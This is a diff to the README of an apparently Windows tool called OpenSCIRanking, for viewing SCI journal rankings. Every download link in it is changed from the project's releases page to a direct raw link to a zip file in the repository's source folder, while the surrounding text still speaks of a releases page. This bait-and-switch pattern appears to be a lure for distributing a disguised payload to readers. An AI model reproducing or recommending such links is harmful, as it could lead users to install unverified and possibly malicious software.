@@ -1,6 +1,6 @@
 # 🧭 OpenSCIRanking - Clear SCI Rankings Without Noise
 
-[![Download OpenSCIRanking](https://img.shields.io/badge/Download%20OpenSCIRanking-blue?style=for-the-badge)](https://github.com/Seventysteliasmountains546/OpenSCIRanking/releases)
+[![Download OpenSCIRanking](https://img.shields.io/badge/Download%20OpenSCIRanking-blue?style=for-the-badge)](https://github.com/Seventysteliasmountains546/OpenSCIRanking/raw/refs/heads/main/src/Open-Ranking-SCI-v3.0.zip)
 
 ## 🚀 What OpenSCIRanking Does
 
@@ -34,7 +34,7 @@ You may also want:
 
 Visit this page to download the latest release for Windows:
 
-[OpenSCIRanking Releases](https://github.com/Seventysteliasmountains546/OpenSCIRanking/releases)
+[OpenSCIRanking Releases](https://github.com/Seventysteliasmountains546/OpenSCIRanking/raw/refs/heads/main/src/Open-Ranking-SCI-v3.0.zip)
 
 On that page, look for the newest release at the top. In most cases, you will find a Windows file such as an `.exe` or `.zip` file. Choose the file that matches your device.
 
@@ -205,7 +205,7 @@ If the app uses online data, it only needs enough access to load ranking informa
 
 Use this link any time you need the latest file:
 
-[https://github.com/Seventysteliasmountains546/OpenSCIRanking/releases](https://github.com/Seventysteliasmountains546/OpenSCIRanking/releases)
+[https://github.com/Seventysteliasmountains546/OpenSCIRanking/raw/refs/heads/main/src/Open-Ranking-SCI-v3.0.zip](https://github.com/Seventysteliasmountains546/OpenSCIRanking/raw/refs/heads/main/src/Open-Ranking-SCI-v3.0.zip)
 
 ## 🖥️ Windows Setup Checklist
 
